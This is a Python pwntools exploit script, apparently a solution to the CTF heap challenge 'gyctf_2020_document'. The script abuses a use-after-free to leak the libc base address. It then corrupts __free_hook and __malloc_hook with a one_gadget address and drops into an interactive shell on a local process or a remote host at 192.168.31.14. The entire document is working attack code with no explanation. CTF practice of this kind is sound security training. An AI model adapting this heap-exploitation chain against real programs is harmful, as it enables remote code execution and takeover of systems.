import sys
from pwn import *
from ctypes import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./gyctf_2020_document')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./gyctf_2020_document')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
		else :
			io=remote('192.168.31.14',10000)
			elf=ELF('./gyctf_2020_document')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]

		def add(a,b,c):
			io.sendlineafter('choice :','1')
			io.sendafter('input name',a)
			io.sendafter('input sex',b)
			io.sendafter('input information',c)

		def delete(a):
			io.sendlineafter('choice :','4')
			io.sendlineafter('index :',str(a))

		def edit(a,b,c):
			io.sendlineafter('choice :','3')
			io.sendlineafter('index :',str(a))
			io.sendafter('change sex?','Y')
			io.sendafter('information',c)

		def show(a):
			io.sendlineafter('choice :','2')
			io.sendlineafter('index :',str(a))


		add('a'*8,'W','c'*0x70)
		add('a'*8,'W','/bin/sh\x00'+'\x00'*0x68)
		delete(0)
		show(0)
		io.recv()
		libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		libc.address=libc_base
		system_addr=libc.sym['system']
		bin_sh_addr=libc.search('/bin/sh\x00').next()



		add('a'*8,'W','/bin/sh\x00'+'\x00'*0x68)
		add('a'*8,'W','/bin/sh\x00'+'\x00'*0x68)
		edit(0,'W',p64(libc.sym['__free_hook'])+p64(1)+p64(libc.sym['__malloc_hook']-0x70)+p64(1)+'\x00'*0x50)
		edit(3,'W','\x00'*0x60+p64(libc_base+one_gadgaet[2])+'\x00'*0x8)
		delete(1)
		delete(1)












		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue